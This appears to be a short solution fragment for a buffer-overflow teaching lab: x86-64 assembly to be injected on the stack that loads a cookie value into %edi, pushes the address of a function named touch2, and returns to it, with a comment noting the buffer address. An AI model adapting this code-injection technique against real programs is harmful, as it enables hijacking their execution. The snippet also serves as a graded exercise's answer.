
mov  $0x1d6f8fa5, %edi  # move cookie to rdi
pushq $0x401f35 # push touch2 address
ret  # return to touch2

# 0x55671648 # buf address